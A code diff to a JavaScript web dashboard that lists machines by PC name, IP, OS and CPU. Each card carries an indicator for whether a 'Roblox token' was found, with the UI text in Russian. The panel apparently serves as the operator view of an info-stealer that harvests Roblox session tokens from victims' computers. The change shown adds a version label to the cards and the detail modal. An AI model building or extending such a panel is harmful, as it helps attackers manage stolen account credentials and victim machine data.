@@ -242,11 +242,14 @@ function renderFiles(list) {
     const title = hasValidToken ? "Roblox токен найден" : "Токен отсутствует или недействителен";
     let indicator = "<div class='roblox-indicator' style='position:absolute; top:12px; right:12px; width:10px; height:10px; border-radius:50%; background:" + color + "; box-shadow:0 0 15px " + color + "; z-index: 10;' title='" + title + "'></div>";
 
+    const ver = f.computer?.version || "7.0.0\u20137.0.1";
+
     html += "<div class='file-card' onclick=\"openModalByIndex(" + idx + ")\" style='position:relative'>" +
               indicator +
               "<div class='card-preview'>" + previewHTML + "</div>" +
               "<div class='card-body'>" +
                 "<div class='card-title' title='" + escapeHtml(pcName) + "'>" + escapeHtml(pcName) + "</div>" +
+                "<div class='card-version'>v" + escapeHtml(ver) + "</div>" +
               "</div>" +
             "</div>";
   }
@@ -282,6 +285,7 @@ function openModalByIndex(idx) {
 
   document.getElementById("modalFilename").textContent = nm;
   document.getElementById("specName").textContent = pc.name || "—";
+  document.getElementById("specVersion").textContent = pc.version ? "v" + pc.version : "7.0.0\u20137.0.1";
   document.getElementById("specIp").textContent = pc.ip || "—";
   document.getElementById("specOs").textContent = pc.os || "—";
   document.getElementById("specCpu").textContent = pc.cpu || "—";
